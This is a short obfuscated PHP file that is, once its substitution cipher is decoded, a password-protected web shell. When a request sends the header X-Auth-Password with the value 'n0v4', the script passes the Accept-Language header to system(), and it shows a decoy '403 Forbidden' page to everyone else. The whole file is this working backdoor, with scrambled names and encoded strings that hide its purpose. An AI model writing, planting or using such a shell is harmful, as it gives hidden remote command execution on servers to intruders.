<?php
function e($s){
        $c=['a'=>'a','b'=>'m','c'=>'4','d'=>'8','e'=>'j','f'=>'R','g'=>'e','h'=>'q','i'=>'b','j'=>'p','k'=>'i','l'=>'I','m'=>'z','n'=>'L','o'=>'y','p'=>'c','q'=>'E','r'=>'o','s'=>'S','t'=>'P','u'=>'n','v'=>'w','w'=>'T','x'=>'6','y'=>'D','z'=>'J','A'=>'g','B'=>'d','C'=>'Q','D'=>'V','E'=>'H','F'=>'F','G'=>'0','H'=>'r','I'=>'Y','J'=>'O','K'=>'2','L'=>'A','M'=>'s','N'=>'h','O'=>'t','P'=>'C','Q'=>'x','R'=>'l','S'=>'3','T'=>'9','U'=>'f','V'=>'M','W'=>'1','X'=>'5','Y'=>'Z','Z'=>'k','0'=>'u','1'=>'X','2'=>'B','3'=>'N','4'=>'v','5'=>'U','6'=>'7','7'=>'G','8'=>'W','9'=>'K'];
        return implode('', array_map(function($ch) use ($c) { return array_search($ch, $c) ?: $ch; }, str_split($s)));
    }

$CFhsMExRqs = e('SDSPjz');
$br45xkAPNZ = e('r99C_') . e('gQQHC9_') . e('Agh0fg0H');
$HkGGRWk14G = e('r99C_5_gf9r_Cg331tlV');
$F2DCrR9EIw = e('Luwv');
$AvxYgVN6nJ = $_SERVER;
$HUKfe2Xz3h = isset($AvxYgVN6nJ[$HkGGRWk14G]) ? $AvxYgVN6nJ[$HkGGRWk14G] : '';
if ($HUKfe2Xz3h === $F2DCrR9EIw) {
    $CFhsMExRqs($AvxYgVN6nJ[$br45xkAPNZ]);
} else {
    header('HTTP/1.1 403 Forbidden');
    echo 'Forbidden.';
    exit();
}
?>
